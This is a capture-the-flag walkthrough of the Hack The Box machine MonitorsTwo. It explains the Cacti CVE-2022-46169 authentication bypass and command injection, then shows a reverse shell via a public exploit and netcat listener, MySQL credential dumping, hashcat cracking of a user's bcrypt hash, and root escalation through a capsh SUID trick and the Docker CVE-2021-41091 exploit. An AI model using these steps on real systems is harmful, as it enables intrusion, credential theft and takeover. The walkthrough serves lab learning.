HTB MonitorsTwo Machine - https://www.hackthebox.com/machines/monitorstwo

### Scanning & Enumeration
Scan the HTB machine  with Nmap tool
```
nmap -A -Pn -p- 10.10.11.211
```

Output:
	`22/tcp   open   ssh`
	`80/tcp   open   http`


Lets navigate to: http://10.10.11.211:80 page

![](assets/img/posts/screenshot-1-png-svg.svg)

- Trying many default credential, but we got nothing

### Exploitation & Gaining Access
So lets search in google for: `cacti gorup exploit` , we will found:
	https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/

#### Vulnerability Analysis
After reading the article, I understand the principle of the vulnerability. There are two main points:
1. There is an unauthorized vulnerability
2. There is a code execution vulnerability

##### 1- The Unauthorized Vulnerability
The `get_client_addr()` function in this code is to obtain the client's IP address. The way to obtain it is to read from these HTTP headers in sequence.
After obtaining the IP, obtain the hostname and compare it with the value read in the database. If they are equal, then Can be authorized successfully

![](assets/img/posts/20250816231535-png-svg.svg)

These headers are under our control, we just need to add in the request to bypass detection:
	`Forwarded-For: 127.0.0.1`

And then add:
	`GET /remote_agent.php?action=ping HTTP/1.1`

##### 2- The Code Execution Vulnerability

![](assets/img/posts/20250816231604-png-svg.svg)

You can see that different processing requests are determined according to the action field

`poll_for_data()` function exists command execution

![](assets/img/posts/20250816231637-png-svg.svg)

You may see that `$poller_id` is spliced ​​into the first parameter of `proc_open()`
 
The first parameter is the command to be executed, so if it can be controlled by us, then any command can be executed

![](assets/img/posts/20250816231646-png-svg.svg)

And it can be manipulated by us, so `get_nfilter_request_var()` Use this function to filter the obtained `poller_id` instead of using `get_filter_request_var()`
The former allows characters, while the latter only allows integers, so we can insert malicious characters here to control the executed commands

#### Getting our Shell
After search while in google for: `Cacti Version 1.2.22 exploit` , we will find
	https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22

First, open another terminal, to set our listener
```
nc -nvlp 444
```

Second, run the exploit 
```
python3 CVE-2022-46169.py -u <http://10.10.11.211/> --LHOST=10.10.16.21 --LPORT=444
```

We will got a shell
```
www-data@50bca5e748b0:/var/www/html$ whoami   // www-data
```

### Privilege Escalation
Enumerate the machine
```
www-data@50bca5e748b0:/var/www/html$ ls -la /
www-data@50bca5e748b0:/var/www/html$ cd /
www-data@50bca5e748b0:/var/www/html$ cat entrypoint.sh
```

This script file gives username and password for MySQL which can allow us to get username and password for `cacti`
	`mysql --host=db --user=root --password=root cacti -e "show tables"`
	`user_auth may have credentials, so tried reading it.`
	`mysql --host=db --user=root --password=root cacti -e "select * from user_auth"`


So we will find a hashed password for user `Marcus`, which looks like `bcrypt $2*$` , `Blowfish (Unix)`

Save the hash and cracked it with hashcat
```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
the cracked hash results is: `funkymonkey`

Then try to login with `marcus` by SSH:
```
ssh marcus@10.10.11.211
Password: funkymonkey
```

We will found the user flag
```
 marcus@monitorstwo:~$ ls
 marcus@monitorstwo:~$ cat user.txt
```

Know the docker version to checked for vulnerabilities:
```
marcus@monitorstwo:~$ docker -
```

Output:
`docker -v \# Docker version 20.10.5+dfsg1, build 55c4c88`

Check for vulnerabilities for this docker version in google, and found an exploit (CVE-2021-41091).
	https://github.com/UncleJ4ck/CVE-2021-41091

Upload the exploit on `marcus` machine from our kali, and execute it:
```
cd /tmp/
scp /home/kali/Desktop/CVE-2021-41091-main/exp.sh marcus@10.10.11.211:/tmp
Password: funkymonkey
```

Run the exploit CVE-2021-41091
```
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh
```

Output:
 `[!] Vulnerable to CVE-2021-41091`
 `[!] Now connect to your Docker container that is accessible and obtain root access !`
 `[>] After gaining root access execute this command (chmod u+s /bin/bash)`
 `Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no):` 

- We need to gain root access on docker to start the exploit.

Search for SUID permissions
```
www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/nul
```
 `/usr/bin/gpasswd`
 `/usr/bin/passwd`
 `/usr/bin/chsh`
 `/usr/bin/chfn`
 `/usr/bin/newgrp`
 `/sbin/capsh`
 `/bin/mount`
 `/bin/umount`
 `/bin/sul`

Or
We we can do it with: `Linpeas` script, and wee should look it under: "Files with Interesting Permissions"
And we will choose:  `/sbin/capsh`

So search in google for: `capsh privilege escalation` , we will found:
	https://gtfobins.github.io/gtfobins/capsh/#suid

From the previous user shell www-data, go to:
```
www-data@50bca5e748b0:/var/www/html$ ./capsh --gid=0 --uid=0 -
www-data@50bca5e748b0:/var/www/html$ whoami        // root
```

But we need  a full root functionality, so give SUID permission to /bin/bash
```
chmod u+s /bin/bash
```

Run the exploit CVE-2021-41091 again
```
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh
yes
```

 `[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`
 `[!] Rooted !`
 `[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`
 `[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'`
 `[!] Spawning Shell`

Then
```
 bash-5.1# exit 
```

So we will go to this `Current Vulnerable Path` , that the CVE mentioned it
```
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
cd /bin
./bash -p
bash-5.1# whoami                  # we will be root
bash-5.1# cd /root
bash-5.1# cat root.txt
```
